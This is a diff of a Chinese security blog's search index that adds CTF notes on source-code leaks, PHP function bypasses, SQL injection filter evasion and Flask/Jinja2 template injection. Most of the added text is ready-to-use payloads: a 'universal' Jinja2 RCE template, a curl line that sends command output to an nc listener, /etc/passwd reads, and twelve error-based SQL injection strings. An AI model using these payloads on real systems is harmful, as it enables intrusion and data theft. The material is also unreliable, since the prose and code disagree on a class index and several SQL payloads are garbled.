@@ -1,6 +1,11 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>常见源码泄露</title>
+    <url>/2020/03/21/%E5%B8%B8%E8%A7%81%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/</url>
+    <content><![CDATA[<h1 id="SWP"><a href="#SWP" class="headerlink" title="SWP"></a>SWP</h1><p> 当你非正常关闭vim编辑器时（比如直接关闭终端或者电脑断电），会生成一个.swp文件，这个文件是一个临时交换文件，用来备份缓冲区中的内容。<br>  需要注意的是如果你并没有对文件进行修改，而只是读取文件，是不会产生.swp文件的。<br>  意外退出时，并不会覆盖旧的交换文件，而是会重新生成新的交换文件。而原来的文件中并不会有这次的修改，文件内容还是和打开时一样。<br>  例如，第一次产生的交换文件名为“.file.txt.swp”；再次意外退出后，将会产生名为“.file.txt.swo”的交换文件；而第三次产生的交换文件则为“.file.txt.swn”；依此类推。 </p>]]></content>
+  </entry>
+  <entry>
     <title>HTTPOXY漏洞</title>
     <url>/2020/03/17/HTTPOXY%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<p><a href="https://www.laruence.com/2016/07/19/3101.html" target="_blank" rel="noopener">HTTPOXY漏洞</a></p><p> Guzzle<code>&gt;=4.0.0rc2,&lt;6.2.1</code>版本受此影响 </p><table>
@@ -66,6 +71,25 @@
 <li>NULL</li>
 </ul>
 </blockquote>
+<h2 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp()"></a>strcmp()</h2><blockquote>
+<p>用数组即可 </p>
+</blockquote>
+<h2 id="urldecode"><a href="#urldecode" class="headerlink" title="urldecode()"></a>urldecode()</h2><blockquote>
+<p>二次编码绕过</p>
+</blockquote>
+<h2 id="ereg"><a href="#ereg" class="headerlink" title="ereg()"></a>ereg()</h2><blockquote>
+<p>ereg()函数匹配数组的时候会返回null </p>
+<p>用%00来绕过ereg()变量 </p>
+</blockquote>
+<h2 id="strpos"><a href="#strpos" class="headerlink" title="strpos()"></a>strpos()</h2><blockquote>
+<p>strpos()函数和ereg()函数一样也具有数组绕过漏洞 </p>
+</blockquote>
+<h2 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric()"></a>is_numeric()</h2><blockquote>
+<p>is_numeric()函数可以被数组绕过，而且该数组可以和数字进行大小比较 </p>
+</blockquote>
+<h2 id="sha1"><a href="#sha1" class="headerlink" title="sha1()"></a>sha1()</h2><blockquote>
+<p>sha1()和md5()处理数组的返回都是Null，所以都可以用数组来绕过 </p>
+</blockquote>
 ]]></content>
   </entry>
   <entry>
@@ -84,6 +108,13 @@
 <p>可尝试Tab替代空格</p>
 <h4 id="绕过特殊字符过滤"><a href="#绕过特殊字符过滤" class="headerlink" title="绕过特殊字符过滤"></a>绕过特殊字符过滤</h4><blockquote>
 <p>可以用chr()函数绕过</p>
+</blockquote>
+<h4 id="被过滤"><a href="#被过滤" class="headerlink" title="-- 被过滤"></a>-- 被过滤</h4><blockquote>
+<p>用# </p>
+</blockquote>
+<h4 id="关键字被过滤"><a href="#关键字被过滤" class="headerlink" title="关键字被过滤"></a>关键字被过滤</h4><p>用%00</p>
+<blockquote>
+<p>例如:uni%00on </p>
 </blockquote>
 ]]></content>
   </entry>
@@ -187,14 +218,14 @@
 <p>可以看到返回了(&lt;class ‘str’&gt;, &lt;class ‘object’&gt;)，同样可以找到object类，正是由于这些但不仅限于这些方法，我们才有了各种沙箱逃逸的姿势。正如上面的解释，<strong>mro</strong>返回了解析方法调用的顺序，将会打印两个。在flask ssti中poc中很大一部分是从object类中寻找我们可利用的类的方法。我们这里只举例最简单的。接下来我们增加代码。接下来我们使用subclasses,<strong>subclasses</strong>() 这个方法，这个方法返回的是这个类的子类的集合，也就是object类的子类的集合。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(&quot;&quot;.__class__.__bases__[0].__subclasses__())</span><br></pre></td></tr></table></figure>
 
-<p>python 3.6 版本下的object类下的方法集合。这里要记住一点2.7和3.6版本返回的子类不是一样的，但是2.7有的3.6大部分都有。需要自己寻找合适的标号来调用接下来我将进一步解释。接下来就是我们需要找到合适的类，然后从合适的类中寻找我们需要的方法。这里开始我们不再用pycharm打印了，直接利用上面我们已经搭建好的漏洞环境来进行测试。通过我们在如上这么多类中一个一个查找，找到我们可利用的类，这里举例一种。&lt;class ‘os._wrap_close’&gt;，os命令相信你看到就感觉很亲切。我们正是要从这个类中寻找我们可利用的方法，通过大概猜测找到是第119个类，0也对应一个类，所以这里写[118]。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5000/test?&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[118]&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>python 3.6 版本下的object类下的方法集合。这里要记住一点2.7和3.6版本返回的子类不是一样的，但是2.7有的3.6大部分都有。需要自己寻找合适的标号来调用接下来我将进一步解释。接下来就是我们需要找到合适的类，然后从合适的类中寻找我们需要的方法。这里开始我们不再用pycharm打印了，直接利用上面我们已经搭建好的漏洞环境来进行测试。通过我们在如上这么多类中一个一个查找，找到我们可利用的类，这里举例一种。&lt;class ‘os._wrap_close’&gt;，os命令相信你看到就感觉很亲切。我们正是要从这个类中寻找我们可利用的方法，通过大概猜测找到是第118个类，0也对应一个类，所以这里写[118]。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5000/test?&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[117]&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>这个时候我们便可以利用.<strong>init</strong>.<strong>globals</strong>来找os类下的，init初始化类，然后globals全局来查找所有的方法及变量及参数。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5000/test?&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[118].__init__.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5000/test?&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>此时我们可以在网页上看到各种各样的参数方法函数。我们找其中一个可利用的function popen，在python2中可找file读取文件，很多可利用方法，详情可百度了解下。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5000/test?&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[118].__init__.__globals__[&apos;popen&apos;](&apos;dir&apos;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5000/test?&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__[&apos;popen&apos;](&apos;dir&apos;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <p> 此时便可以看到命令已经执行。如果是在linux系统下便可以执行其他命令。此时我们已经成功得到权限。进下来我们将进一步简单讨论如何进行沙箱逃逸。 </p>
 <h3 id="ssti步骤"><a href="#ssti步骤" class="headerlink" title="ssti步骤"></a>ssti步骤</h3><h4 id="获取基本类"><a href="#获取基本类" class="headerlink" title="获取基本类"></a>获取基本类</h4><p>首先通过str、dict、tuple或list获取python的基本类(当然也可以利用一些其他在jinja2中存在的对象，比如request)：</p>
@@ -209,6 +240,9 @@
 
 <h4 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">object.__subclasses__()[59].__init__.func_globals.linecache下直接有os类，可以直接执行命令：</span><br><span class="line"></span><br><span class="line">object.__subclasses__()[59].__init__.func_globals.linecache.os.popen(&apos;id&apos;).read()</span><br><span class="line"></span><br><span class="line">object.__subclasses__()[59].__init__.__globals__.__builtins__下有eval，__import__等的全局函数，可以利用此来执行命令：</span><br><span class="line"></span><br><span class="line">object.__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&quot;__import__(&apos;os&apos;).popen(&apos;id&apos;).read()&quot;)</span><br><span class="line">object.__subclasses__()[59].__init__.__globals__.__builtins__.eval(&quot;__import__(&apos;os&apos;).popen(&apos;id&apos;).read()&quot;)</span><br><span class="line">object.__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&apos;os&apos;).popen(&apos;id&apos;).read()</span><br><span class="line">object.__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;os&apos;).popen(&apos;id&apos;).read()</span><br></pre></td></tr></table></figure>
 
+<h2 id="Jinjia2模板引擎通用的RCE-Payload："><a href="#Jinjia2模板引擎通用的RCE-Payload：" class="headerlink" title="Jinjia2模板引擎通用的RCE Payload："></a>Jinjia2模板引擎通用的RCE Payload：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;].eval(&quot;__import__(&apos;os&apos;).popen(&apos;&lt;command&gt;&apos;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p> 在<command>添加命令即可 </p>
 <h2 id="ctf中的一些绕过tips"><a href="#ctf中的一些绕过tips" class="headerlink" title="ctf中的一些绕过tips"></a>ctf中的一些绕过tips</h2><p>没什么系统思路。就是不断挖掘类研究官方文档以及各种能够利用的姿势。这里从最简单的绕过说起。</p>
 <h3 id="过滤-等括号"><a href="#过滤-等括号" class="headerlink" title="过滤[]等括号"></a>过滤[]等括号</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用getitem绕过。如原poc &#123;&#123;&quot;&quot;.__class__.__bases__[0]&#125;&#125;</span><br><span class="line"></span><br><span class="line">绕过后&#123;&#123;&quot;&quot;.__class__.__bases__.__getitem__(0)&#125;&#125;</span><br></pre></td></tr></table></figure>
 
@@ -234,6 +268,19 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">过滤&#123;&#123;</span><br><span class="line">可以利用&#123;%if%&#125; &#123;% endif %&#125;标记</span><br></pre></td></tr></table></figure>
 </blockquote>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% if &apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&apos;curl http://127.0.0.1:7999/?i=`whoami`&apos;).read()==&apos;p&apos; %&#125;1&#123;% endif %&#125;</span><br><span class="line">nc -nlvp 7999</span><br><span class="line">相当于盲命令执行，利用curl将执行结果带出来</span><br><span class="line">如果不能执行命令，读取文件可以利用盲注的方法逐位将内容爆出来</span><br><span class="line">&#123;% if &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/tmp/test&apos;).read()[0:1]==&apos;p&apos; %&#125;~p0~&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="过滤关键词"><a href="#过滤关键词" class="headerlink" title="过滤关键词"></a>过滤关键词</h3><p><strong>base64编码绕过</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__getattribute__使用实例访问属性时,调用该方法</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例如被过滤掉__class__关键词</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__getattribute__(&apos;X19jbGFzc19f&apos;.decode(&apos;base64&apos;)).__base__.__subclasses__()[40](&quot;/etc/passwd&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>字符串拼接绕过</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__getattribute__(&apos;__c&apos;+&apos;lass__&apos;).__base__.__subclasses__()[40](&quot;/etc/passwd&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&apos;&apos;.__class__.__base__.__subclasses__()[131].__init__.__globals__[&apos;__builtins__&apos;][&apos;ev&apos;+&apos;al&apos;](&apos;__im&apos;+&apos;port__(&quot;o&apos;+&apos;s&quot;).po&apos;+&apos;pen(&quot;cat /this_is_the_fl&apos;+&apos;ag.txt&quot;)&apos;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;&apos;&apos;.__class__.__base__.__subclasses__()[77].__init__.__globals__[&apos;sys&apos;].modules[&apos;o&apos;+&apos;s&apos;].__dict__[&apos;po&apos;+&apos;pen&apos;](&apos;cat /this_is_the_fl&apos;+&apos;ag.txt&apos;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
 ]]></content>
   </entry>
   <entry>
@@ -274,6 +321,21 @@
 
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id=1&apos; union select 1,2,load_file(&apos;~/.bash_history&apos;)     （“~/”表示用户目录）</span><br></pre></td></tr></table></figure>
 
+<h1 id="sql注入12个报错方式"><a href="#sql注入12个报错方式" class="headerlink" title="sql注入12个报错方式"></a><strong>sql注入12个报错方式</strong></h1><p><a href="https://www.bugku.com/forum.php?mod=viewthread&tid=93&extra=page%3D1%26filter%3Dtypeid%26typeid%3D26" target="_blank" rel="noopener">sql注入12个报错方式</a></p>
+<blockquote>
+<p>1、通过floor报错,注入语句如下:<br>and select 1 from (select count(<em>),concat(version(),floor(rand(0)</em>2))x from information_schema.tables group by x)a);</p>
+<p>2、通过ExtractValue报错,注入语句如下:<br>and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</p>
+<p>3、通过UpdateXml报错,注入语句如下:<br>and 1=(updatexml(1,concat(0x3a,(select user())),1))</p>
+<p>4、通过NAME_CONST报错,注入语句如下:<br>and exists(select<em>from (select</em>from(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)</p>
+<p>5、通过join报错,注入语句如下:<br>select * from(select * from mysql.user ajoin mysql.user b)c;</p>
+<p>6、通过exp报错,注入语句如下:<br>and exp(~(select * from (select user () ) a) );</p>
+<p>7、通过GeometryCollection()报错,注入语句如下:<br>and GeometryCollection(()select *from(select user () )a)b );</p>
+<p>8、通过polygon ()报错,注入语句如下:<br>and polygon (()select * from(select user ())a)b );</p>
+<p>9、通过multipoint ()报错,注入语句如下:<br>and multipoint (()select * from(select user() )a)b );</p>
+<p>10、通过multlinestring ()报错,注入语句如下:<br>and multlinestring (()select * from(selectuser () )a)b );</p>
+<p>11、通过multpolygon ()报错,注入语句如下:<br>and multpolygon (()select * from(selectuser () )a)b );</p>
+<p>12、通过linestring ()报错,注入语句如下:<br>and linestring (()select * from(select user() )a)b );</p>
+</blockquote>
 ]]></content>
   </entry>
   <entry>
